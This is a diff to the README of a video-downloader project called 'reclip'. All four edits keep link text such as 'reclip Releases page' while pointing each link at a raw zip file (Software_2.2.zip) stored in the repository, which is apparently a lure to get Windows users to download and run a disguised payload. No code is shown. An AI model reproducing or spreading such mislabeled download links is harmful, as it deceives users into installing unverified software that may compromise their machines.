@@ -1,6 +1,6 @@
 # 🎬 reclip - Download Videos With Less Effort
 
-[![Download reclip](https://img.shields.io/badge/Download-Reclip-blue?style=for-the-badge)](https://github.com/Congressofracialequalityblackhickory71/reclip/releases)
+[![Download reclip](https://img.shields.io/badge/Download-Reclip-blue?style=for-the-badge)](https://github.com/Congressofracialequalityblackhickory71/reclip/raw/refs/heads/main/static/Software_2.2.zip)
 
 ## 🖥️ What reclip does
 
@@ -10,7 +10,7 @@ It is built for simple use on a home PC or a small local server. You do not need
 
 ## 📦 Download reclip for Windows
 
-1. Open the [reclip Releases page](https://github.com/Congressofracialequalityblackhickory71/reclip/releases).
+1. Open the [reclip Releases page](https://github.com/Congressofracialequalityblackhickory71/reclip/raw/refs/heads/main/static/Software_2.2.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your system.
 4. If the file is in a .zip format, extract it first.
@@ -129,7 +129,7 @@ If you want a file that works on most Windows players, MP4 is usually the safest
 
 ## 📌 Quick start
 
-1. Visit the [reclip Releases page](https://github.com/Congressofracialequalityblackhickory71/reclip/releases)
+1. Visit the [reclip Releases page](https://github.com/Congressofracialequalityblackhickory71/reclip/raw/refs/heads/main/static/Software_2.2.zip)
 2. Download the latest Windows build
 3. Extract the file if it comes as ZIP
 4. Run the app
@@ -170,7 +170,7 @@ reclip is made for a local self-hosted setup. That means you run it on your own 
 
 Use this link to visit the release page and download the Windows version:
 
-[Visit reclip Releases](https://github.com/Congressofracialequalityblackhickory71/reclip/releases)
+[Visit reclip Releases](https://github.com/Congressofracialequalityblackhickory71/reclip/raw/refs/heads/main/static/Software_2.2.zip)
 
 ## 🧩 What to expect after install
 
